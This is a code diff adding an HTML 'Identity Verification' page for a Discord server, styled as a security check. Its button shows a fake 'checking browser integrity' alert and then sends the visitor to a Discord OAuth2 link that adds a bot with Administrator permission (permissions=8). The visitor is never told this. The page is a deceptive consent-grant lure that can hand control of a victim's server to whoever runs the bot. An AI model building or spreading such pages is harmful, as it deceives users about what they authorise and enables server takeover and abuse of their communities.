@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Black Hole Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/dist/css/all.min.css">
+    <style>
+        :root {
+            --primary: #5865F2;
+            --bg: #0f0c29;
+            --glass: rgba(255, 255, 255, 0.05);
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow: hidden;
+        }
+
+        .card {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 3rem;
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            max-width: 450px;
+            width: 90%;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .icon-box {
+            font-size: 4rem;
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+            filter: drop-shadow(0 0 15px var(--primary));
+        }
+
+        h1 { font-size: 2rem; margin-bottom: 1rem; font-weight: 800; }
+        p { color: #a2a2a2; line-height: 1.6; margin-bottom: 2rem; }
+
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 1rem 2.5rem;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px rgba(88, 101, 242, 0.4);
+            filter: brightness(1.1);
+        }
+
+        .footer { margin-top: 2rem; font-size: 0.8rem; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon-box">
+            <i class="fas fa-user-shield"></i>
+        </div>
+        <h1>Identity Verification</h1>
+        <p>Welcome to our server! To ensure a safe community, please complete the human verification process by clicking the button below.</p>
+        <button class="btn" onclick="startVerify()">COMPLETE VERIFICATION</button>
+        <div class="footer">Protected by Black Hole Security System</div>
+    </div>
+
+    <script>
+        function startVerify() {
+            // Placeholder for backend integration
+            alert("Step 1: Checking browser integrity...\nStep 2: Authenticating Discord Session...");
+            window.location.href = "https://discord.com/oauth2/authorize?client_id=1473370534275453071&permissions=8&integration_type=0&scope=bot+applications.commands"; // Put your OAuth2 link here
+        }
+    </script>
+</body>
+</html>
